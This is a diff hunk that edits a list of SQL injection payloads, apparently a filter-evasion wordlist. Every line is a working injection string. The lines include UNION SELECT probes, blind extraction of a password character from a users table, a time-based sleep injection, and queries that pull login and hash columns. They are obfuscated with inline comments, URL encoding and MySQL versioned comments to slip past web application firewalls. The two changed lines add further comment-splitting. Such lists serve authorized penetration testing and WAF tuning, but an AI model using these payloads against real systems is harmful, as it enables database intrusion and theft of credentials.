@@ -8,14 +8,14 @@
 1+un/**/ion+sel/**/ect+1,2,3--
 1+and+ascii(lower(mid((select+pwd+from+users+limit+1,1),1,1)))=74
 /*!50000%75%6e%69on*/ %73%65%6cect 1
-%2c(select%20*%20from%20(select(sleep(10)))a)
+%2c(sel/**/ect%20*%20from%20(sel/**/ect(sleep(10)))a)
 /*!12345UnioN*//**/(/*!12345seLECT*//**/1)
 /*!12345#qa%0A#%0AUnIOn*/(/*!12345#qa%0A#%0ASeleCt*//**/1)
 @a:=(/*!50000concat(database/**_**/(),"--","_Y000!_")*/)
 -1+/*!50000union*/+/*!50000selec*/+1,2,3,4,5,6,7+--+
 -1+UNION+SELECT+1+INTO+@,@
 1+UnIoN/**/SeLecT/**/1,2,3--
-1+UNunionION+SEselectLECT+1,2,3--
+1+UNun/**/ionION+SEse/**/lectLECT+1,2,3--
 -15 /*!u%6eion*/ /*!se%6cect*/ 1,2,3,4
 (1)union(select(1),mid(hash,1,32)from(users))
 1+union+(select'1',concat(login,hash)from+users)
